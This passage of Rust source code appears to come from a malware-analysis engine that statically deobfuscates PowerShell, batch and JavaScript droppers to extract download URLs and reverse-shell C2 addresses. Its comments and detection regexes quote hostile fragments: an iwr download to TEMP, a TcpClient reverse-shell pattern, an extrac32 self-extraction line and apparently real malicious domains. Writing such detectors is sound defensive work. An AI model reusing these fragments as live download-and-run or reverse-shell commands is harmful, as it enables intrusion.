        let chain_continues = gap.chars().all(|c| c.is_whitespace() || c == '+');
        if !chain_continues {
            try_extract_url_from_buf(&buf, &known, &mut seen, env);
            buf.clear();
        }
        for tok in nums.as_str().split(',') {
            let tok = tok.trim();
            if let Ok(n) = tok.parse::<u32>() {
                if n < 256 {
                    buf.push((n as u8) as char);
                }
            }
        }
        prev_end = outer.end();
    }
    try_extract_url_from_buf(&buf, &known, &mut seen, env);
}

fn try_extract_url_from_buf(
    buf: &str,
    known: &std::collections::HashSet<String>,
    seen: &mut std::collections::HashSet<String>,
    env: &mut Environment,
) {
    if buf.is_empty() {
        return;
    }
    // The decoded chain often is `http://host/path` directly.
    if let Some(idx) = buf
        .find("http://")
        .or_else(|| buf.find("https://"))
        .or_else(|| buf.find("ftp://"))
    {
        let tail = &buf[idx..];
        let url: String = tail
            .chars()
            .take_while(|c| !c.is_whitespace() && *c != '"' && *c != '\'' && *c != '<' && *c != '>')
            .collect();
        if url.len() < 10 || url.len() > 2048 {
            return;
        }
        if is_noise_ip(&url) {
            return;
        }
        if known.contains(&url) || !seen.insert(url.clone()) {
            return;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "ps-char-concat".to_string(),
        });
    }
}

/// PowerShell `.Replace('xyz', 'abc')` URL deobfuscation. The `as.ps1` /
/// `zp.ps1` / `mx.ps1` / `zk.ps1` / `eua.ps1` family hides URLs by
/// peppering them with a 2-3 char marker (`eq0`, `ibl`, `dgu`, `mo4`,
/// `fwz`) and applies `.Replace(marker, 'e')` / `.Replace('quwd', 'tps://')`
/// at runtime. We mirror that statically: collect every `(needle,
/// replacement)` pair the body declares, then apply them to every quoted
/// string that *looks like an obfuscated URL template* (starts with `ht`
/// or contains `quwd`/`htxp`) and emit the result if it's a real URL.
pub fn scan_ps_replace_chain_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_ps_replace_chain_url_atom(deobfuscated) {
        return;
    }
    // Collect every `.Replace('A', 'B')` (and `-replace 'A', 'B'`) pair.
    let pairs = crate::aes_chain::ps_extract::find_replace_chain(deobfuscated);
    if pairs.is_empty() {
        return;
    }
    // Candidate strings: quoted literals whose head looks like an
    // obfuscated URL scheme (`ht…`, `quwd`, `htxp`) or already contains a
    // scheme but with extra marker garbage. Cap length to keep regex
    // backtracking bounded.
    static URL_TEMPLATE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"['"]((?:ht|quwd|htxp|hxxp)[A-Za-z0-9._/\\?&=:%~+\-]{8,400})['"]"#)
            .expect("url template re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in URL_TEMPLATE_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let mut s = m.as_str().to_string();
        // Apply every pair longest-needle-first so substring noise like
        // `quwd` is collapsed before `e`-style replacements compound it.
        let mut ordered = pairs.clone();
        ordered.sort_by_key(|(n, _)| std::cmp::Reverse(n.len()));
        for (needle, replacement) in &ordered {
            if needle.is_empty() {
                continue;
            }
            s = s.replace(needle.as_str(), replacement.as_str());
        }
        let s_lower = s.to_ascii_lowercase();
        if !(s_lower.starts_with("http://")
            || s_lower.starts_with("https://")
            || s_lower.starts_with("ftp://")
            || s_lower.starts_with("file://"))
        {
            continue;
        }
        // Trim trailing punctuation, same rules as the post-pass sweep.
        while let Some(last) = s.chars().last() {
            if matches!(
                last,
                ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?' | '\\'
            ) {
                s.pop();
            } else {
                break;
            }
        }
        if s.len() < 10 || is_noise_url(&s) {
            continue;
        }
        if known.contains(&s) || !seen.insert(s.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: s,
            line_hint: "ps-replace-chain-deob".to_string(),
        });
    }
}

fn has_ps_replace_chain_url_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    (lower.contains(".replace")
        || lower.contains("-replace ")
        || lower.contains("-replace\t")
        || lower.contains("-replace\r")
        || lower.contains("-replace\n"))
        && (lower.contains("htxp")
            || lower.contains("hxxp")
            || lower.contains("quwd")
            || lower.contains("http")
            || lower.contains("ftp:")
            || lower.contains("file:"))
}

/// PowerShell char-index-extractor deobfuscation. Family pattern
/// (Musculos / 订单列表.bat style — 30+ corpus samples):
///
///   function Musculos ($filmprod,…){
///       $overill=3;
///       do { $sirp+=$filmprod[$overill]; $overill+=4; … }
///       until (!$filmprod[$overill]) $sirp
///   }
///   $u = Musculos 'a.ahaaataaataaapaaasaaa:aaa…'
///   # ↓ extracts chars at positions 3, 7, 11, 15, … → 'https://…'
///
/// We detect the function definition's `$idx=START; do{ …$arg[$idx];
/// $idx+=STEP }`, then for every call site `NAME 'literal'` we extract
/// chars at indices START, START+STEP, START+2*STEP, … and run URL_RE
/// on the result. Any URLs we surface as `DownloadInDeobText`.
pub fn scan_ps_char_index_extractor_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_ps_char_index_extractor_atom(deobfuscated) {
        return;
    }

    // Two-pass detection because the `regex` crate lacks backreferences:
    //   (1) Find `function NAME(...){...}` blocks (header capture only).
    //   (2) Inside each block, find any `$IDX=START` / `$IDX+=STEP`
    //       pair where IDX is the same identifier. Verify `[$IDX]` is
    //       referenced as an array index too.
    static FN_BLOCK_RE: Lazy<Regex> = Lazy::new(|| {
        // Permissive body — real samples intersperse Compare-Object
        // decoys; the body matching tolerates them. `[^}]{50,2000}` is
        // a soft cap to avoid pathological cases.
        Regex::new(r#"(?is)function\s+(\w+)\s*\(\s*\$\w+[^)]*\)\s*\{([^}]{50,2000})\}"#)
            .expect("ps char-idx fn block re")
    });
    static IDX_INIT_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\$(\w+)\s*=\s*(\d{1,3})\s*;"#).expect("idx init re"));
    static IDX_STEP_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\$(\w+)\s*\+\s*=\s*(\d{1,3})"#).expect("idx step re"));
    static IDX_USE_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\[\s*\$(\w+)\s*\]"#).expect("idx use re"));
    let mut extractors: Vec<(String, usize, usize)> = Vec::new();
    for caps in FN_BLOCK_RE.captures_iter(deobfuscated) {
        let (Some(name), Some(body)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let body = body.as_str();
        // Build {ident → start} from $IDX=N pattern.
        let mut starts: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
        for ic in IDX_INIT_RE.captures_iter(body) {
            if let (Some(v), Some(n)) = (ic.get(1), ic.get(2)) {
                if let Ok(start) = n.as_str().parse::<usize>() {
                    if start < 256 {
                        starts.entry(v.as_str().to_string()).or_insert(start);
                    }
                }
            }
        }
        // Same for steps.
        let mut steps: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
        for sc in IDX_STEP_RE.captures_iter(body) {
            if let (Some(v), Some(n)) = (sc.get(1), sc.get(2)) {
                if let Ok(step) = n.as_str().parse::<usize>() {
                    if (1..=64).contains(&step) {
                        steps.entry(v.as_str().to_string()).or_insert(step);
                    }
                }
            }
        }
        // Indices actually used as array subscripts.
        let mut used: std::collections::HashSet<String> = std::collections::HashSet::new();
        for uc in IDX_USE_RE.captures_iter(body) {
            if let Some(v) = uc.get(1) {
                used.insert(v.as_str().to_string());
            }
        }
        // Pick the index that has init AND step AND is used as `[$idx]`.
        for (var, start) in &starts {
            if let Some(step) = steps.get(var) {
                if used.contains(var) {
                    extractors.push((name.as_str().to_string(), *start, *step));
                    break;
                }
            }
        }
        if extractors.len() >= 8 {
            break;
        }
    }
    if extractors.is_empty() {
        return;
    }
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for (name, start, step) in &extractors {
        // Match every call site: `Musculos 'literal'` or `Musculos "literal"`.
        // The regex is built dynamically since the name varies per sample.
        let pattern = format!(
            r#"(?i)\b{}\s+['"]([^'"]{{16,8000}})['"]"#,
            regex::escape(name)
        );
        let Ok(call_re) = Regex::new(&pattern) else {
            continue;
        };
        let mut extracted_strings = Vec::new();
        let mut extracted_urls = Vec::new();
        for call_caps in call_re.captures_iter(deobfuscated).take(64) {
            let Some(arg) = call_caps.get(1) else {
                continue;
            };
            let arg_str = arg.as_str();
            let chars: Vec<char> = arg_str.chars().collect();
            let mut extracted = String::with_capacity(chars.len() / step + 1);
            let mut idx = *start;
            while idx < chars.len() {
                extracted.push(chars[idx]);
                idx += step;
            }
            if extracted.len() < 8 {
                continue;
            }
            extracted_strings.push(extracted.clone());
            // Look for URLs in the extracted string.
            for url_caps in URL_RE.captures_iter(&extracted) {
                let Some(m) = url_caps.get(1) else { continue };
                let url = trim_liberal_url_suffix(m.as_str()).to_string();
                if url.len() < 8 || is_noise_url(&url) {
                    continue;
                }
                if known.contains(&url) || !seen.insert(url.clone()) {
                    continue;
                }
                extracted_urls.push(url);
            }
        }
        if extracted_urls.is_empty() {
            continue;
        }
        let has_download_context = extracted_strings.iter().any(|s| {
            let lower = s.to_ascii_lowercase();
            lower.contains("downloadfile")
                || lower.contains("downloadstring")
                || lower.contains("invoke-webrequest")
                || lower.contains("invoke-restmethod")
                || lower.contains("start-bitstransfer")
        });
        for url in extracted_urls {
            let cmd = format!(
                "ps-char-index-extractor (fn={}, start={}, step={})",
                name, start, step
            );
            if has_download_context {
                env.traits.push(Trait::Download {
                    cmd,
                    src: url,
                    dst: None,
                });
            } else {
                env.traits.push(Trait::DownloadInDeobText {
                    src: url,
                    line_hint: cmd,
                });
            }
        }
    }
}

fn has_ps_char_index_extractor_atom(text: &str) -> bool {
    text.as_bytes().contains(&b'$')
        && text.as_bytes().windows(2).any(|window| window == b"+=")
        && has_ps_variable_index_atom(text)
        && contains_ascii_case_insensitive_atom(text, b"function")
        && ((contains_ascii_case_insensitive_atom(text, b"do")
            && contains_ascii_case_insensitive_atom(text, b"until"))
            || contains_ascii_case_insensitive_atom(text, b"for"))
}

fn has_ps_variable_index_atom(text: &str) -> bool {
    let bytes = text.as_bytes();
    let mut idx = 0;
    while idx < bytes.len() {
        if bytes[idx] != b'[' {
            idx += 1;
            continue;
        }
        idx += 1;
        while idx < bytes.len() && bytes[idx].is_ascii_whitespace() {
            idx += 1;
        }
        if idx < bytes.len() && bytes[idx] == b'$' {
            return true;
        }
    }
    false
}

/// PowerShell socket-style reverse shells store the C2 address as
/// SEPARATE `$ipaddress = '<ip>'` and `$dport = <port>` literals at
/// the top, then later invoke `New-Object Net.Sockets.TcpClient($ip,
/// $port)` with variable args. The TcpClient regex in
/// `scan_remote_connects` can't capture those (the constructor only
/// sees the variable names), so the C2 IP+port pair leaks. This
/// scanner connects the dots: when the script defines a single
/// public-IPv4 literal AND a single port literal AND uses
/// TcpClient/Socket/WebClient anywhere, emit `RemoteConnect{ip,port}`.
/// One pair only — multi-IP scripts (load balancers, ranges) would
/// risk pairing the wrong values and aren't C2-typical anyway.
pub fn scan_ps_var_socket_connect(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Need socket / network primitive usage somewhere in the script
    // for this pair to make sense as a C2 indicator.
    static SOCKET_USE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)(?:New-Object\s+(?:System\.)?Net\.Sockets|TcpClient|UdpClient|\.Connect\(|WebClient|HttpWebRequest)"#,
        )
        .expect("socket use re")
    });
    if !SOCKET_USE_RE.is_match(deobfuscated) {
        return;
    }
    // Collect `$var = 'IP'` and `$var = PORT`. We want literal-string
    // OR bare-int RHS — don't fire on expressions.
    static IP_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\$\w+\s*=\s*['"](\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})['"]"#)
            .expect("ip var re")
    });
    static PORT_VAR_RE: Lazy<Regex> = Lazy::new(|| {
        // Match `$port = 443`, `$dport = 443`, etc. Var name must hint
        // at port semantics to avoid pairing a stray integer literal
        // (random counters, sleep durations) with the IP.
        Regex::new(r#"(?i)\$\w*(?:port|prt)\w*\s*=\s*(\d{1,5})\b"#).expect("port var re")
    });
    // Public-IPv4 filter (excluding RFC1918, loopback, link-local, 0.0.0.0).
    fn is_public_v4(ip: &str) -> bool {
        let parts: Vec<u8> = ip.split('.').filter_map(|p| p.parse().ok()).collect();
        if parts.len() != 4 {
            return false;
        }
        let (a, b) = (parts[0], parts[1]);
        if a == 0 || a == 127 || a == 10 {
            return false;
        }
        if a == 172 && (16..=31).contains(&b) {
            return false;
        }
        if a == 192 && b == 168 {
            return false;
        }
        if a == 169 && b == 254 {
            return false;
        }
        true
    }
    // Find every public-IP var-assignment and pair it with the
    // nearest port-var-assignment within 256 chars (forward OR
    // backward — adjacency order varies). That handles multi-port
    // scripts (buffer-size literals named `$newport` etc. won't be
    // the closest one to the IP).
    let ip_hits: Vec<(usize, String)> = IP_VAR_RE
        .captures_iter(deobfuscated)
        .filter_map(|c| {
            let m = c.get(1)?;
            let ip = m.as_str().to_string();
            if !is_public_v4(&ip) {
                return None;
            }
            Some((m.start(), ip))
        })
        .collect();
    let port_hits: Vec<(usize, u16)> = PORT_VAR_RE
        .captures_iter(deobfuscated)
        .filter_map(|c| {
            let m = c.get(1)?;
            let p: u16 = m.as_str().parse().ok()?;
            if p == 0 || p == 256 || p == 1024 || p == 2048 || p == 4096 {
                // Drop power-of-2 buffer-size lookalikes; real C2 ports
                // rarely land on these.
                return None;
            }
            Some((m.start(), p))
        })
        .collect();
    if ip_hits.is_empty() || port_hits.is_empty() {
        return;
    }
    // Dedup the pairs we'd emit so multi-IP or multi-port scripts
    // don't fan out — at most one RemoteConnect per (ip, port).
    let mut emitted: std::collections::HashSet<(String, u16)> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            crate::traits::Trait::RemoteConnect { host, port, .. } => Some((host.clone(), *port)),
            _ => None,
        })
        .collect();
    for (ip_pos, ip) in &ip_hits {
        let Some((_, port)) = port_hits
            .iter()
            .min_by_key(|(p_pos, _)| (*p_pos as isize - *ip_pos as isize).unsigned_abs())
        else {
            continue;
        };
        // Only count pairs within 256 chars — beyond that it's
        // unlikely they belong together.
        let port_pos = port_hits
            .iter()
            .find(|(_, p)| p == port)
            .map(|(pos, _)| *pos)
            .unwrap_or(*ip_pos);
        if port_pos.abs_diff(*ip_pos) > 256 {
            continue;
        }
        let pair = (ip.clone(), *port);
        if !emitted.insert(pair.clone()) {
            continue;
        }
        env.traits.push(crate::traits::Trait::RemoteConnect {
            cmd: format!("$ipaddress = '{ip}'; $port = {port}; … TcpClient($ip, $port)"),
            host: pair.0,
            port: pair.1,
        });
    }
}

/// Detect `extrac32 /Y "src" "dst"` self-extraction patterns in the
/// deobfuscated text and emit `Trait::Extrac32` + `Trait::SelfExtract`.
/// The dispatcher already emits these for batch scripts that reach
/// `interp::interpret_line`, but the bat/CAB dual-detonation pattern
/// (15 corpus samples) hides the `extrac32 /y "%~f0" "%tmp%\x.exe"`
/// line inside a CAB header — input never goes through `drive()` so
/// the handler never fires. Running this scanner over the printable-
/// ASCII runs that `scan_binary_input_urls` carves out of the CAB
/// head catches it.
pub fn scan_extrac32_self_extract(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static EXTRAC32_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?ix)
                \b extrac32 (?:\.exe)? \b
                (?: \s+ /[a-z] )*           # flags like /y /e /a /c
                \s+ ["']? ([^"'\s]+) ["']?  # src
                \s+ ["']? ([^"'\s]+) ["']?  # dst
            "#,
        )
        .expect("extrac32 re")
    });
    for caps in EXTRAC32_RE.captures_iter(deobfuscated) {
        let (Some(src), Some(dst)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let src_s = src.as_str().to_string();
        let dst_s = dst.as_str().to_string();
        let self_reference = src_s.contains("%~f0")
            || src_s.contains("%~F0")
            || src_s.contains("%0")
            || src_s.contains("script.bat");
        let already = env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::Extrac32 { src, dst, .. } if src == &src_s && dst == &dst_s
            )
        });
        if already {
            continue;
        }
        env.traits.push(crate::traits::Trait::Extrac32 {
            src: src_s,
            dst: dst_s,
            self_reference,
        });
        if self_reference {
            // Use the existing SelfExtract variant so analyst tooling
            // already keyed off it (PE/CAB self-extracts) sees this
            // bat/CAB dual-detonation pattern too.
            let has_self_extract = env
                .traits
                .iter()
                .any(|t| matches!(t, crate::traits::Trait::SelfExtract { .. }));
            if !has_self_extract {
                env.traits.push(crate::traits::Trait::SelfExtract {
                    method: "extrac32-self-cab".to_string(),
                });
            }
        }
    }
}

/// JavaScript `unescape('%3C%21DOCTYPE…')` / `decodeURIComponent(...)`
/// URL-encoded blob decoder. 8 corpus .js samples wrap their HTA/JS
/// payload (which often hosts `https://gov-cn.cloud/01Gni`-style C2
/// URLs in inline `targets = [...]` arrays) inside a single
/// `unescape('%XX%XX…')` literal. The bare bytes after decoding are
/// HTML/JS text; URL_RE picks any URLs straight out.
pub fn scan_js_unescape_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Unbounded upper limit on the captured arg: Rust's regex DFA
    // size is exponential in the explicit upper bound, and
    // `{12,16384}` blows past the 10 MB cap. Cap the lex run via the
    // text limit instead — `URL_RE.captures_iter` is bounded by the
    // post-decode `min(16 KB)`, and length sanity-checks below skip
    // anything absurd.
    static UNESCAPE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\b(?:unescape|decodeURIComponent)\s*\(\s*['"]([^'"]+)['"]\s*\)"#)
            .expect("js unescape re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in UNESCAPE_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let encoded = m.as_str();
        // %XX → byte. Anything else passes through. Mirrors JS's
        // `unescape()` semantics: also handles `%uXXXX` for UTF-16
        // codepoints (rare in our corpus but trivial to support).
        let decoded = js_unescape(encoded);
        if decoded.len() < 8 {
            continue;
        }
        // Bounded scan: 16 KB is plenty for the largest unescape blob
        // in the corpus and keeps URL_RE's worst case predictable.
        let scan = &decoded[..decoded.len().min(16 * 1024)];
        for url_caps in URL_RE.captures_iter(scan) {
            let Some(url_m) = url_caps.get(1) else {
                continue;
            };
            let url = trim_liberal_url_suffix(url_m.as_str()).to_string();
            if url.len() < 8 || is_noise_url(&url) {
                continue;
            }
            if known.contains(&url) || !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url,
                line_hint: "js-unescape".to_string(),
            });
        }
    }
}

/// Mirror JavaScript's `unescape()` / `decodeURIComponent()` —
/// `%XX` → byte (interpreted as UTF-8 string), `%uXXXX` → UTF-16
/// codepoint. Invalid escapes pass through literally.
fn js_unescape(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out_bytes: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            // `%uXXXX` — 4 hex digits, UTF-16 codepoint.
            if (bytes[i + 1] == b'u' || bytes[i + 1] == b'U') && i + 5 < bytes.len() {
                let hex = std::str::from_utf8(&bytes[i + 2..i + 6]).unwrap_or("");
                if let Ok(cp) = u32::from_str_radix(hex, 16) {
                    if let Some(c) = char::from_u32(cp) {
                        let mut buf = [0u8; 4];
                        out_bytes.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
                        i += 6;
                        continue;
                    }
                }
            }
            // `%XX` — 2 hex digits, byte.
            let hex = std::str::from_utf8(&bytes[i + 1..i + 3]).unwrap_or("");
            if let Ok(b) = u8::from_str_radix(hex, 16) {
                out_bytes.push(b);
                i += 3;
                continue;
            }
        }
        out_bytes.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out_bytes).into_owned()
}

/// JavaScript `String.fromCharCode(78,69,84,…)` URL deobfuscation.
/// 330 corpus .js samples use this; the eszja_1.3.41.js family
/// encodes `https://nav.domains/fall_back` as a sequence of ASCII
/// codepoints. We decode each fromCharCode list and run URL_RE on
/// the result. Multi-list concatenation (`String.fromCharCode(…) +
/// String.fromCharCode(…)`) is handled by also concatenating
/// *consecutive* decodes from the same scan.
pub fn scan_js_fromcharcode_urls(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    // Captures a sequence of `\d+(,\s*\d+)+` inside fromCharCode(…).
    // Minimum 5 nums so we don't over-match `fromCharCode(0x41)`-style
    // single-char calls (those are too short to carry an http URL).
    static FCC_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bString\.fromCharCode\s*\(\s*([\d\s,]+)\)"#).expect("from char code re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    // Track positions of consecutive calls so we can concat-decode
    // `String.fromCharCode(…) + String.fromCharCode(…)` chains.
    let matches: Vec<_> = FCC_RE.captures_iter(deobfuscated).collect();
    let mut decoded_chunks: Vec<(usize, usize, String)> = Vec::with_capacity(matches.len());
    for caps in &matches {
        let Some(m_arg) = caps.get(1) else { continue };
        let mut decoded = String::with_capacity(m_arg.as_str().len() / 3);
        for num in m_arg.as_str().split(',') {
            let num = num.trim();
            if num.is_empty() {
                continue;
            }
            let Ok(n): Result<u32, _> = num.parse() else {
                continue;
            };
            if let Some(c) = char::from_u32(n) {
                if !c.is_control() || c == '\n' || c == '\t' {
                    decoded.push(c);
                }
            }
        }
        if decoded.len() < 5 {
            continue;
        }
        let Some(whole) = caps.get(0) else { continue };
        decoded_chunks.push((whole.start(), whole.end(), decoded));
    }
    // Concatenate adjacent chunks (`A + B` with `+` between them) and
    // also try each chunk alone. Up to 16 KB of concat to keep URL_RE
    // bounded.
    let mut to_scan: Vec<String> = Vec::with_capacity(decoded_chunks.len() * 2);
    for (i, (_, _, dec)) in decoded_chunks.iter().enumerate() {
        to_scan.push(dec.clone());
        // Build the run of adjacent chunks (separated only by whitespace
        // or `+`).
        let mut run = dec.clone();
        let mut last_end = decoded_chunks[i].1;
        for (start, end, next_dec) in &decoded_chunks[i + 1..] {
            let between = &deobfuscated[last_end..*start];
            if between
                .trim_matches(|c: char| c.is_whitespace() || c == '+')
                .is_empty()
            {
                run.push_str(next_dec);
                last_end = *end;
                if run.len() > 16 * 1024 {
                    break;
                }
            } else {
                break;
            }
        }
        if run.len() > dec.len() {
            to_scan.push(run);
        }
    }
    for chunk in &to_scan {
        for url_caps in URL_RE.captures_iter(chunk) {
            let Some(m) = url_caps.get(1) else { continue };
            let url = trim_liberal_url_suffix(m.as_str()).to_string();
            if url.len() < 8 || is_noise_url(&url) {
                continue;
            }
            if known.contains(&url) || !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url,
                line_hint: "js-fromcharcode".to_string(),
            });
        }
    }
}

/// PowerShell + WScript samples often pass a *scheme-less* URL to
/// `Start-Process` / `iwr` / `irm` / `Invoke-WebRequest` /
/// `Invoke-RestMethod`. Windows' .NET WebClient and ShellExecute treat
/// `host.tld/path` as an `http://host.tld/path` URI when the protocol
/// handler can't resolve it as a file path. Common corpus shape:
///
///   iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe
///   Start-Process 'goingupdate.com/ptoleqco'
///
/// URL_RE skips these because it anchors on `https?://`. We synthesize
/// the `http://` prefix and emit as `DownloadInDeobText` so analyst
/// tooling treats them like any other download.
pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_ps_bare_url_download_atom(deobfuscated) {
        return;
    }
    // Strict allowlist of TLDs we trust — broad enough to cover the
    // corpus's actual hits (rebrand.ly, goingupdate.com, 31yc.com,
    // backupitfirst.com) without firing on `Wscript.Shell`,
    // `Script.Shell`, `New-Object Net.WebClient` etc.
    static PS_BARE_URL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?ix)
                \b (?: Start-Process | saps | iwr | irm
                     | Invoke-WebRequest | Invoke-RestMethod ) \b
                \s+ (?:-(?:Uri|Ur|FilePath|FilePat|FilePa|FileP|File|Fil|Fi|F|Path|Pat|Pa|P)(?:\s+|[:=]))?
                ['"]
                (
                    (?:[a-z0-9\-]+\.){1,4}
                    (?:com|net|org|io|ru|cn|me|info|biz|us|co|ly|gg|tk|xyz
                     |top|life|store|app|tools|rocks|click|stream|host|website
                     |pw|dev|sh|space|site|live|cloud|online|tech|art|news|pro|cc|to)
                    (?:/[^\s'"<>]{0,200})?
                )
                ['"]
            "#,
        )
        .expect("ps bare url re")
    });
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in PS_BARE_URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let mut host_path = m.as_str().to_string();
        // Trim trailing punctuation that survives the quote anchors
        // (the regex doesn't include `;`/`,` etc. but a defensive trim
        // catches obfuscator-injected garbage).
        while let Some(last) = host_path.chars().last() {
            if matches!(
                last,
                ',' | '.' | ';' | ':' | ')' | ']' | '}' | '!' | '?' | '\\'
            ) {
                host_path.pop();
            } else {
                break;
            }
        }
        if host_path.len() < 6 {
            continue;
        }
        let url = format!("http://{host_path}");
        if is_noise_url(&url) {
            continue;
        }
        if known.contains(&url) || !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "ps-bare-url-download".to_string(),
        });
    }
}

fn has_ps_bare_url_download_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    if !(lower.contains("start-process")
        || lower.contains("saps")
        || lower.contains("iwr")
        || lower.contains("irm")
        || lower.contains("invoke-webrequest")
        || lower.contains("invoke-restmethod"))
    {
        return false;
    }
    if !(lower.contains('\'') || lower.contains('"')) {
        return false;
    }
    [
        "com", "net", "org", "io", "ru", "cn", "me", "info", "biz", "us", "co", "ly", "gg", "tk",
        "xyz", "top", "life", "store", "app", "tools", "rocks", "click", "stream", "host",
        "website", "pw", "dev", "sh", "space", "site", "live", "cloud", "online", "tech", "art",
        "news", "pro", "cc", "to",
    ]
    .iter()
    .any(|tld| {
        let dotted = format!(".{tld}");
        lower.contains(&format!("{dotted}/"))
            || lower.contains(&format!("{dotted}'"))
            || lower.contains(&format!("{dotted}\""))
    })
}

pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in B64_INLINE_RE.captures_iter(deobfuscated) {
        let b64 = match caps.get(1) {
            Some(m) => m.as_str(),
            None => continue,
        };
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        // Decoded blob can be either:
        //   (a) the URL itself (rare; older `[byte[]]$u=[Convert]::From…(URL_B64)` form)
        //   (b) a PS one-liner with one or more URLs embedded (Data.ps1 /
        //       Datanew.ps1 / yenisc2.ps1 / stub.ps1 family — the whole
        //       script is a single FromBase64String wrapped in `iex`).
        // Decode UTF-8 first; fall back to lossy so a stray binary tail
        // doesn't sink an otherwise-readable PS payload.
        let text = match String::from_utf8(decoded) {
            Ok(s) => s,
            Err(e) => String::from_utf8_lossy(e.as_bytes()).into_owned(),
        };
        let trimmed = text.trim();
        // (a) bare-URL fast path — preserves prior behaviour.
        if (trimmed.starts_with("http://")
            || trimmed.starts_with("https://")
            || trimmed.starts_with("ftp://"))
            && trimmed.len() <= 2048
            && trimmed.chars().all(|c| !c.is_control())
        {
            let url = trimmed.to_string();
            if !known.contains(&url) && seen.insert(url.clone()) {
                env.traits.push(Trait::DownloadInDeobText {
                    src: url,
                    line_hint: "FromBase64String inline".to_string(),
                });
            }
            continue;
        }
        // (b) PS-body sweep — extract every URL the decoded text contains.
        // Bounded: only the first few KB of decoded text are scanned to
        // keep the regex's worst case predictable on a maxed-out 8000-char
        // b64 input.
        let scan = &text[..text.len().min(8192)];
        for c2 in URL_RE.captures_iter(scan) {
            let Some(m) = c2.get(1) else { continue };
            let url = trim_liberal_url_suffix(m.as_str()).to_string();
            if url.len() < 8 || is_noise_url(&url) {
                continue;
            }
            if known.contains(&url) || !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url,
                line_hint: "FromBase64String inline (decoded PS body)".to_string(),
            });
        }
    }
}

#[allow(clippy::expect_used)]
static QUOTED_B64_RE: Lazy<Regex> = Lazy::new(|| {
    // Single OR double quoted base64 string ≥60 chars
    Regex::new(r#"['"]([A-Za-z0-9+/]{60,1500}={0,2})['"]"#).expect("quoted b64")
});

pub fn scan_bare_b64_urls(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in QUOTED_B64_RE.captures_iter(deobfuscated) {
        let Some(b64_m) = caps.get(1) else { continue };
        let b64 = b64_m.as_str();
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        // Try UTF-8 first
        let text = match String::from_utf8(decoded.clone()) {
            Ok(s) => s,
            Err(_) => {
                // Fallback: pure ASCII bytes-as-chars
                let s: String = decoded
                    .iter()
                    .filter(|b| b.is_ascii())
                    .map(|b| *b as char)
                    .collect();
                if s.len() < decoded.len() {
                    continue;
